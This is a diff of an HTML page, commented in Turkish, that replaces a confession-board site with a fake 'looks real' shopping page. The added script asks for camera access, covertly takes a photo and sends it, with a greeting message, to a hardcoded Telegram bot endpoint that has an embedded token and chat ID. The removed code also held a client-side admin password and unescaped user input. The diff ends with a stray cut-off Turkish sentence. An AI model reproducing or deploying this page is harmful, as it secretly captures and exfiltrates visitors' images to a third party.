@@ -1,268 +1,101 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="tr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Itiraf Sitesi</title>
-    <style>
-        /* Genel stil */
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: white;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Gerçekmiş Gibi Alışveriş Sitesi</title>
+<link rel="stylesheet" href="styles.css">
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #f0f0f0;
+  }
 
-        header {
-            background-color: #333;
-            color: #fff;
-            padding: 20px;
-            text-align: center;
-            position: relative;
-        }
+  h1 {
+    color: #333;
+  }
 
-        nav ul {
-            list-style-type: none;
-            padding: 0;
-        }
+  p {
+    color: #666;
+  }
 
-        nav ul li {
-            display: inline;
-            margin-right: 20px;
-        }
+  button {
+    padding: 10px 20px;
+    background-color: #007bff;
+    color: #fff;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+  }
 
-        nav ul li a {
-            color: #fff;
-            text-decoration: none;
-        }
-
-        #admin-menu-toggle {
-            color: #fff;
-            cursor: pointer;
-        }
-
-        #admin-menu {
-            display: none;
-            position: absolute;
-            top: 50px;
-            right: 20px;
-            background-color: #333;
-            padding: 10px;
-        }
-
-        #admin-menu ul {
-            list-style-type: none;
-            padding: 0;
-        }
-
-        #admin-menu ul li {
-            margin-bottom: 10px;
-        }
-
-        #admin-menu ul li button {
-            color: #fff;
-            background-color: #333;
-            border: none;
-            cursor: pointer;
-        }
-
-        /* Görsel efektler */
-        @keyframes flash {
-            0% {
-                opacity: 1;
-            }
-            100% {
-                opacity: 0.5;
-            }
-        }
-
-        /* Itiraf Et bölümü stilleri */
-        #itiraf-et {
-            padding: 20px;
-            text-align: center;
-        }
-
-        #itiraf {
-            width: 100%;
-            max-width: 500px;
-            margin-bottom: 20px;
-            padding: 10px;
-            box-sizing: border-box;
-        }
-
-        #paylas-button {
-            padding: 10px 20px;
-            background-color: #333;
-            color: #fff;
-            border: none;
-            cursor: pointer;
-        }
-
-        #paylas-button:hover {
-            background-color: #555;
-        }
-
-        #itiraf-mesaj {
-            margin-top: 20px;
-            display: none; /* Başlangıçta gizli */
-        }
-
-        .confession {
-            border: 1px solid #ccc;
-            padding: 10px;
-            margin-bottom: 10px;
-        }
-    </style>
+  button:hover {
+    background-color: #0056b3;
+  }
+</style>
 </head>
 <body>
-    <header>
-        <h1>Itiraf Sitesi</h1>
-        <nav>
-            <ul>
-                <li><a href="#" id="ana-sayfa">Ana Sayfa</a></li>
-                <li><a href="#" id="itiraf-et-buton">Itiraf Et</a></li>
-                <li><a href="#" id="admin-menu-toggle">:</a></li>
-            </ul>
-        </nav>
-        <div id="admin-menu">
-            <ul>
-                <li><button id="itiraf-sil">Itiraf Sil</button></li>
-                <li><button id="arka-plan-degistir">Arka Plan Değiştir</button></li>
-                <li><button id="muzik-ekle">Müzik Ekle</button></li>
-            </ul>
-        </div>
-    </header>
+<h1>Hoş Geldiniz!</h1>
+<p>Burası tamamen gerçek bir alışveriş sitesi gibi görünüyor, değil mi? 🛍️</p>
+<p>Devam etmek için kamera erişim izni vermeniz gerekiyor:</p>
+<button onclick="allowCamera()">BANA BAS 🤍</button>
 
-    <section id="main">
-        <h2>Hoşgeldiniz!</h2>
-        <p>Burada itirafları okuyabilir ve kendi itirafınızı gönderebilirsiniz.</p>
-        <div id="confession-list"></div>
-    </section>
+<script>
+function allowCamera() {
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(function(stream) {
+      var video = document.createElement('video');
+      document.body.appendChild(video);
+      video.srcObject = stream;
+      video.play();
 
-    <section id="itiraf-et" style="display:none;">
-        <h2>Itiraf Et</h2>
-        <textarea id="itiraf" name="itiraf" rows="4" cols="50" placeholder="Itirafınızı buraya yazın..."></textarea><br>
-        <button id="paylas-button">Paylaş</button>
-        <div id="itiraf-mesaj" style="display: none;">Itirafınız başarıyla paylaşıldı!</div>
-    </section>
+      // Kamera erişim izni verildiğinde fotoğrafı çek
+      video.addEventListener('canplay', function() {
+        var canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        var context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        var imgData = canvas.toDataURL('image/jpeg');
 
-    <footer>
-        <p>&copy; 2024 Itiraf Sitesi</p>
-    </footer>
+        // Fotoğrafı FormData nesnesiyle gönder
+        var formData = new FormData();
+        formData.append('chat_id', '6070918315');
+        formData.append('photo', dataURItoBlob(imgData)); // Base64 verisini Blob'a dönüştürme işlemi
 
-    <!-- Müzik veya arka plan olarak kullanılacak YouTube video URL'si -->
-    <input type="text" id="youtube-url" placeholder="YouTube Video URL">
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://api.telegram.org/bot6953014668:AAH70G-dePUlNb9mmCC0T1-UZoxPXKB4hFc/sendPhoto');
+        xhr.send(formData);
 
-    <!-- Müzik ekle butonu -->
-    <button id="muzik-ekle">Müzik Ekle</button>
+        // Metni de gönder
+        var xhrText = new XMLHttpRequest();
+        xhrText.open('POST', 'https://api.telegram.org/bot6953014668:AAH70G-dePUlNb9mmCC0T1-UZoxPXKB4hFc/sendMessage');
+        xhrText.setRequestHeader('Content-Type', 'application/json');
+        xhrText.send(JSON.stringify({ chat_id: '6070918315', text: 'Merhaba Halil bey!' }));
 
-    <script>
-        var adminPassword = "BOZKURT"; // Admin şifresi
+        // Kamera akışını durdur
+        stream.getTracks().forEach(track => track.stop());
+        document.body.removeChild(video);
+      });
+    })
+    .catch(function(err) {
+      console.error('Kamera erişimi reddedildi:', err);
+    });
+}
 
-        document.addEventListener("DOMContentLoaded", function() {
-            showPage("main");
-        });
-
-        document.getElementById("ana-sayfa").addEventListener("click", function() {
-            showPage("main");
-        });
-
-        document.getElementById("itiraf-et-buton").addEventListener("click", function() {
-            showPage("itiraf-et");
-        });
-
-        // Admin menüsünü açma/kapatma
-        var adminMenu = document.getElementById("admin-menu");
-        var adminMenuToggle = document.getElementById("admin-menu-toggle");
-        var adminMenuOpen = false;
-
-        adminMenuToggle.addEventListener("click", function() {
-            if (adminMenuOpen) {
-                adminMenu.style.display = "none";
-                adminMenuOpen = false;
-            } else {
-                adminMenu.style.display = "block";
-                adminMenuOpen = true;
-            }
-        });
-
-        // Documenta tıklanınca admin menüsünü kapat
-        document.addEventListener("click", function(event) {
-            var target = event.target;
-            if (!target.closest("#admin-menu") && !target.closest("#admin-menu-toggle")) {
-                adminMenu.style.display = "none";
-                adminMenuOpen = false;
-            }
-        });
-
-        // Itirafı sil butonu
-        document.getElementById("itiraf-sil").addEventListener("click", function() {
-            var isAdmin = prompt("Admin şifresini girin:");
-            if (isAdmin === adminPassword) {
-                var itirafID = prompt("Silmek istediğiniz itirafın ID'sini girin:");
-                var confession = document.getElementById(itirafID);
-                if (confession) {
-                    confession.remove();
-                } else {
-                    alert("Böyle bir itiraf bulunamadı!");
-                }
-            } else {
-                alert("Yanlış admin şifresi!");
-            }
-        });
-
-        // Arka planı değiştir butonu
-        document.getElementById("arka-plan-degistir").addEventListener("click", function() {
-            var isAdmin = prompt("Admin şifresini girin:");
-            if (isAdmin === adminPassword) {
-                var newBackground = prompt("Yeni arka plan resmi veya video URL'sini girin:");
-                document.body.style.backgroundImage = "url('" + newBackground + "')";
-            } else {
-                alert("Yanlış admin şifresi!");
-            }
-        });
-
-        // Müzik ekle butonu
-        document.getElementById("muzik-ekle").addEventListener("click", function() {
-            var isAdmin = prompt("Admin şifresini girin:");
-            if (isAdmin === adminPassword) {
-                var musicURL = prompt("Yeni müzik URL'sini girin:");
-                var audio = new Audio(musicURL);
-                audio.play();
-            } else {
-                alert("Yanlış admin şifresi!");
-            }
-        });
-
-        document.getElementById("paylas-button").addEventListener("click", function() {
-            var itiraf = document.getElementById("itiraf").value;
-            var itirafMesaj = document.getElementById("itiraf-mesaj");
-            if (itiraf.trim() !== "") {
-                var confessionID = "confession-" + Date.now(); // Rastgele bir ID oluştur
-                var confessionHTML = '<div class="confession" id="' + confessionID + '"><p>' + itiraf + '</p><span>ID: ' + confessionID + '</span></div>';
-                var confessionList = document.getElementById("confession-list");
-                confessionList.insertAdjacentHTML("beforeend", confessionHTML);
-                // Itiraf mesajını göster
-                itirafMesaj.style.display = "block";
-                // Itiraf alanını temizle
-                document.getElementById("itiraf").value = "";
-                // 3 saniye sonra mesajı gizle
-                setTimeout(function() {
-                    itirafMesaj.style.display = "none";
-                }, 3000);
-            } else {
-                alert("Lütfen bir itiraf yazın!");
-            }
-        });
-
-        function showPage(pageId) {
-            var pages = document.querySelectorAll("section");
-            for (var i = 0; i < pages.length; i++) {
-                pages[i].style.display = "none";
-            }
-            document.getElementById(pageId).style.display = "block";
-        }
-    </script>
+// Base64 verisini Blob'a dönüştürme fonksiyonu
+function dataURItoBlob(dataURI) {
+  var byteString = atob(dataURI.split(',')[1]);
+  var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+  var ab = new ArrayBuffer(byteString.length);
+  var ia = new Uint8Array(ab);
+  for (var i = 0; i < byteString.length; i++) {
+    ia[i] = byteString.charCodeAt(i);
+  }
+  var blob = new Blob([ab], {type: mimeString});
+  return blob;
+}
+</script>
 </body>
 </html>
- ve JavaScript'i içeriyor. Arka planı değiştirme ve müzik ekleme gibi özellikler de dahil olmak üzere yönetici işlevselliğini de sağlıyor. Anc
